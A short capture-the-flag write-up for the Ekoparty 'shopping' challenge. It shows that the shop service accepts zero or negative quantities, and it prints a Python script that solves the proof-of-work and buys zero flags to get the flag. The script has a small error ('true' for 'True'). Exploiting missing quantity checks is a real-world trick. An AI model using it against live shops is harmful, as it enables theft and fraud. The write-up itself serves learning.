# shopping (pwn, 352p, 90 solved)

a bit of an overstatement to call this `pwn`.
after passing some pow we get access to a black-box shopping service:

```
welcome to ekoparty shopping center
feel free to buy up to 5 items that you may like
use wisely your coins, have fun!


you have 50 coins
what do you wanna buy today?
1. t-shirt		10
2. short		20
3. stickers		1
4. flag			?
```

if we select an item and quantity it will subtract `price*quantity` from our coins if we had enough.
the trick here is to notice that we can pass 0 or even negative numbers as quantity, and the application doesn't check it.
if we pass a negative number it will give us coins.
but we don't even need that much, we can just buy 0 or -1 flags and it will be enough.

we run:

```python
import hashlib
import re

import os

from crypto_commons.netcat.netcat_commons import nc, send, interactive


def pow(task):
    while true:
        data = os.urandom(10)
        if hashlib.sha1(data).hexdigest()[0:6] == task:
            return data


def main():
    url = "shopping.ctf.site"
    port = 21111
    s = nc(url, port)
    data = s.recv(9999)
    task = re.findall("== (.*)", data)[0]
    send(s, pow(task))
    print(s.recv(9999))
    send(s, "4")
    print(s.recv(9999))
    send(s, "0")
    print(s.recv(9999))
    interactive(s)


main()
```

and we get `eko{d0_y0u_even_m4th?}`
